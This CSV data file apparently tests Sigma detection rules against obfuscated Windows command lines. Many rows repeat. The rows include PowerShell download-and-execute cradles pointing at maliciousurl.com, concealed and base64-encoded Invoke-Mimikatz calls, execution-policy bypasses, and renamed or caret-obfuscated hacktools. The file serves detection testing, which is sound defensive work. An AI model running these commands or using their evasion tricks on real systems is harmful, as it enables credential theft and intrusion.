Technical,Rule_name,Title,Rule_id,Command_match_rule,Commandline_evasion,Excutable,Bypass target rule,Bypass all rule,Trigger rule
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""Command"" ""[scriptblock]::Create('In' + 'voke-Mimikatz').Invoke()""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""Command"" ""Set-Alias 'NotMalicious' 'Invoke-Mimikatz'; NotMalicious""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""EncodedCommand"" SQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoA",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""Command"" ""Invoke-Mimikatz""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""Command"" ""$c = 'Invoke-Mimikatz'; Invoke-Expression $c""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""Command"" ""Set-Alias -Name 'NotMalicious' -Value 'Invoke-Mimikatz'; NotMalicious""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""c"" ""iex ('Invoke-' + 'Shell' + 'code')""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""ExecutionPolicy"" Bypass -c ""Invoke-Mimikatz""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""ExecutionPolicy"" Bypass -cOMMAND ""Invoke-Mimikatz""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""ExecutionPolicy"" Bypass /""Command"" ""Invoke-Mimikatz""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -ep Bypass -""Command"" ""Invoke-Mimikatz""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -""NoProfile"" -NonInteractive -exeCUTIonPOLIcY Bypass -CommAND ""IEX (New-Object Net.WebClient).DownloadString('http://maliciousurl.com/payload.ps1')""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NOprofILE -""NonInteractive"" -""ExecutionPolicy"" Bypass -coMMaNd ""IEX (New-Object Net.WebClient).DownloadString('http://maliciousurl.com/payload.ps1')""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -""NonInteractive"" -exECutIOnPOLicy Bypass -c ""IEX (New-Object Net.WebClient).DownloadString('http://maliciousurl.com/payload.ps1')""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,powershell.exe -EncodedCommand JABpbnZvaWQtVHJ1c3QgJABwcm9jZXNz,FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""EncodedCommand"" JABpbnZvaWQtVHJ1c3QgJABwcm9jZXNz",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""Command"" ""& { $k = 'Invoke-'; $m = 'Mimikatz'; Invoke-Expression ($k + $m) }""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""Command"" ""Set-Alias 'NotMalicious' 'Invoke-Mimikatz'; NotMalicious""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""EncodedCommand"" SQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoA",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""Command"" ""Invoke-Mimikatz""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""Command"" ""$c = 'Invoke-Mimikatz'; Invoke-Expression $c""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""Command"" ""Set-Alias -Name 'NotMalicious' -Value 'Invoke-Mimikatz'; NotMalicious""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""c"" ""iex ('Invoke-' + 'Shell' + 'code')""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""ExecutionPolicy"" Bypass -cOMMAND ""Invoke-Mimikatz""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""ExecutionPolicy"" Bypass /""Command"" ""Invoke-Mimikatz""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -ep Bypass -""Command"" ""Invoke-Mimikatz""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NOprofILE -""NonInteractive"" -""ExecutionPolicy"" Bypass -coMMaNd ""IEX (New-Object Net.WebClient).DownloadString('http://maliciousurl.com/payload.ps1')""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -""NonInteractive"" -exECutIOnPOLicy Bypass -c ""IEX (New-Object Net.WebClient).DownloadString('http://maliciousurl.com/payload.ps1')""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""EncodedCommand"" JABpbnZvaWQtVHJ1c3QgJABwcm9jZXNz",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""Command"" ""& { $k = 'Invoke-'; $m = 'Mimikatz'; Invoke-Expression ($k + $m) }""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""Command"" ""[scriptblock]::Create('In' + 'voke-Mimikatz').Invoke()""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""Command"" ""Set-Alias 'NotMalicious' 'Invoke-Mimikatz'; NotMalicious""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""Command"" ""Invoke-Mimikatz""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""Command"" ""Set-Alias -Name 'NotMalicious' -Value 'Invoke-Mimikatz'; NotMalicious""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""c"" ""iex ('Invoke-' + 'Shell' + 'code')""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""ExecutionPolicy"" Bypass -c ""Invoke-Mimikatz""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""ExecutionPolicy"" Bypass -cOMMAND ""Invoke-Mimikatz""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""ExecutionPolicy"" Bypass /""Command"" ""Invoke-Mimikatz""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -ep Bypass -""Command"" ""Invoke-Mimikatz""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NOprofILE -""NonInteractive"" -""ExecutionPolicy"" Bypass -coMMaNd ""IEX (New-Object Net.WebClient).DownloadString('http://maliciousurl.com/payload.ps1')""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -""NonInteractive"" -exECutIOnPOLicy Bypass -c ""IEX (New-Object Net.WebClient).DownloadString('http://maliciousurl.com/payload.ps1')""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,powershell.exe -enc JABpbnZvaWQtVHJ1c3QgJABwcm9jZXNz,FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""EncodedCommand"" JABpbnZvaWQtVHJ1c3QgJABwcm9jZXNz",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""Command"" ""& { $k = 'Invoke-'; $m = 'Mimikatz'; Invoke-Expression ($k + $m) }""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""Command"" ""[scriptblock]::Create('In' + 'voke-Mimikatz').Invoke()""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""Command"" ""Set-Alias 'NotMalicious' 'Invoke-Mimikatz'; NotMalicious""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""EncodedCommand"" SQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoA",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""Command"" ""Invoke-Mimikatz""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""Command"" ""$c = 'Invoke-Mimikatz'; Invoke-Expression $c""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""Command"" ""Set-Alias -Name 'NotMalicious' -Value 'Invoke-Mimikatz'; NotMalicious""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_hktl_sharpview,HackTool - SharpView Execution,b2317cfa-4a47-4ead-b3ff-297438c0bc2d,,"cmd.exe /c ""copy SharpView.exe sv_update.exe & sv_update.exe G^et-Doma^inComputer""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_hktl_sharpview,HackTool - SharpView Execution,b2317cfa-4a47-4ead-b3ff-297438c0bc2d,,"powershell.exe -""NoProfile"" /""ExecutionPolicy"" Bypass -cOmmAND ""Add-Type -Path 'C:\Windows\Temp\SharpView.dll'; [SharpView.Program]::GetDomainComputers()""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_hktl_sharpview,HackTool - SharpView Execution,b2317cfa-4a47-4ead-b3ff-297438c0bc2d,,"powershell.exe -noPrOFilE -""ExecutionPolicy"" Bypass -c ""Add-Type -Path 'C:\Windows\Temp\SharpView.dll'; [SharpView.Program]::GetDomainComputers()""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""c"" ""iex ('Invoke-' + 'Shell' + 'code')""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""ExecutionPolicy"" Bypass -c ""Invoke-Mimikatz""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""ExecutionPolicy"" Bypass -cOMMAND ""Invoke-Mimikatz""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""ExecutionPolicy"" Bypass /""Command"" ""Invoke-Mimikatz""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -ep Bypass -""Command"" ""Invoke-Mimikatz""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NOprofILE -""NonInteractive"" -""ExecutionPolicy"" Bypass -coMMaNd ""IEX (New-Object Net.WebClient).DownloadString('http://maliciousurl.com/payload.ps1')""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -""NoProfile"" -""NonInteractive"" -EXECUTiONPOLICY Bypass -""Command"" ""IEX (New-Object Net.WebClient).DownloadString('http://maliciousurl.com/payload.ps1')""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -""NonInteractive"" -exECutIOnPOLicy Bypass -c ""IEX (New-Object Net.WebClient).DownloadString('http://maliciousurl.com/payload.ps1')""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""EncodedCommand"" JABpbnZvaWQtVHJ1c3QgJABwcm9jZXNz",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""Command"" ""& { $k = 'Invoke-'; $m = 'Mimikatz'; Invoke-Expression ($k + $m) }""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""Command"" ""Set-Alias 'NotMalicious' 'Invoke-Mimikatz'; NotMalicious""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""EncodedCommand"" SQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoA",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""Command"" ""Invoke-Mimikatz""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""Command"" ""$c = 'Invoke-Mimikatz'; Invoke-Expression $c""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""Command"" ""Set-Alias -Name 'NotMalicious' -Value 'Invoke-Mimikatz'; NotMalicious""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_sysinternals_adexplorer_susp_execution,Suspicious Active Directory Database Snapshot Via ADExplorer,ef61af62-bc74-4f58-b49b-626448227652,,"cmd /c ""copy C:\Tools\ADExplorer64.exe C:\Windows\System32\sysinfo.exe && C:\Windows\System32\sysinfo.exe -snapshot C:\PerfLogs\ad.db""",FALSE,FALSE,FALSE,
t1069,proc_creation_win_sysinternals_adexplorer_susp_execution,Suspicious Active Directory Database Snapshot Via ADExplorer,ef61af62-bc74-4f58-b49b-626448227652,,"cmd /C ""copy C:\Tools\ADExplorer64.exe C:\Windows\System32\sysinfo.exe && C:\Windows\System32\sysinfo.exe -snapshot C:\PerfLogs\ad.db""",FALSE,FALSE,FALSE,
t1082,proc_creation_win_hktl_winpwn,HackTool - WinPwn Execution,d557dc06-62e8-4468-a8e8-7984124908ce,,"cmd.exe /c ""W^in^P^wn.exe""",FALSE,FALSE,FALSE,
t1082,proc_creation_win_hktl_winpwn,HackTool - WinPwn Execution,d557dc06-62e8-4468-a8e8-7984124908ce,,"powershell.exe -""ep"" bypass -FILE C:\temp\audit.ps1",FALSE,FALSE,FALSE,
t1082,proc_creation_win_hktl_winpwn,HackTool - WinPwn Execution,d557dc06-62e8-4468-a8e8-7984124908ce,,"cmd.exe /c ""W^in^P^wn.exe""",FALSE,FALSE,FALSE,
t1082,proc_creation_win_hktl_winpwn,HackTool - WinPwn Execution,d557dc06-62e8-4468-a8e8-7984124908ce,,"powershell.exe -""ep"" bypass -FILE C:\temp\audit.ps1",FALSE,FALSE,FALSE,
t1082,proc_creation_win_dtrace_kernel_dump,Suspicious Kernel Dump Using Dtrace,7124aebe-4cd7-4ccb-8df0-6d6b93c96795,,"dtrace.exe -w ""syscall:::return {lkd(0x0); exit(0);}""",FALSE,FALSE,FALSE,
t1082,proc_creation_win_dtrace_kernel_dump,Suspicious Kernel Dump Using Dtrace,7124aebe-4cd7-4ccb-8df0-6d6b93c96795,,"dtrace.exe -w ""syscall:::return {lkd( 0 ); exit(0);}""",FALSE,FALSE,FALSE,
t1082,proc_creation_win_dtrace_kernel_dump,Suspicious Kernel Dump Using Dtrace,7124aebe-4cd7-4ccb-8df0-6d6b93c96795,,"dtrace.exe -w ""syscall:::return {lkd(0); exit(0);}""",FALSE,FALSE,FALSE,
t1082,proc_creation_win_hktl_winpwn,HackTool - WinPwn Execution,d557dc06-62e8-4468-a8e8-7984124908ce,,"cmd.exe /c ""W^in^P^wn.exe""",FALSE,FALSE,FALSE,
t1082,proc_creation_win_hktl_winpwn,HackTool - WinPwn Execution,d557dc06-62e8-4468-a8e8-7984124908ce,,"powershell.exe -""ep"" bypass -FILE C:\temp\audit.ps1",FALSE,FALSE,FALSE,
t1082,proc_creation_win_reg_machineguid,Suspicious Query of MachineGUID,f5240972-3938-4e56-8e4b-e33893176c1f,,"powershell -NOpROfILE -""Command"" ""[Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('SOFTWARE\Microsoft\Cryptography').GetValue('MachineGuid')""",FALSE,FALSE,FALSE,
t1082,proc_creation_win_hktl_winpwn,HackTool - WinPwn Execution,d557dc06-62e8-4468-a8e8-7984124908ce,,"cmd.exe /c ""W^in^P^wn.exe""",FALSE,FALSE,FALSE,
t1082,proc_creation_win_hktl_winpwn,HackTool - WinPwn Execution,d557dc06-62e8-4468-a8e8-7984124908ce,,"powershell.exe -""ep"" bypass -FILE C:\temp\audit.ps1",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""c"" ""iex ('Invoke-' + 'Shell' + 'code')""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""ExecutionPolicy"" Bypass -c ""Invoke-Mimikatz""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""ExecutionPolicy"" Bypass -cOMMAND ""Invoke-Mimikatz""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""ExecutionPolicy"" Bypass /""Command"" ""Invoke-Mimikatz""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -ep Bypass -""Command"" ""Invoke-Mimikatz""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NOprofILE -""NonInteractive"" -""ExecutionPolicy"" Bypass -coMMaNd ""IEX (New-Object Net.WebClient).DownloadString('http://maliciousurl.com/payload.ps1')""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -""NonInteractive"" -exECutIOnPOLicy Bypass -c ""IEX (New-Object Net.WebClient).DownloadString('http://maliciousurl.com/payload.ps1')""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,powershell.exe -enc JABpbnZvaWQtVHJ1c3QgJABwcm9jZXNz,FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,powershell.exe -ENcodEDCOMManD JABpbnZvaWQtVHJ1c3QgJABwcm9jZXNz,FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""Command"" ""& { $k = 'Invoke-'; $m = 'Mimikatz'; Invoke-Expression ($k + $m) }""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""Command"" ""[scriptblock]::Create('In' + 'voke-Mimikatz').Invoke()""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""EncodedCommand"" SQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoA",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""Command"" ""Invoke-Mimikatz""",FALSE,FALSE,FALSE,
t1087,proc_creation_win_powershell_malicious_cmdlets,Malicious PowerShell Commandlets - ProcessCreation,02030f2f-6199-49ec-b258-ea71b07e03dc,,"powershell.exe -""Command"" ""$c = 'Invoke-Mimikatz'; Invoke-Expression $c""",FALSE,FALSE,FALSE,
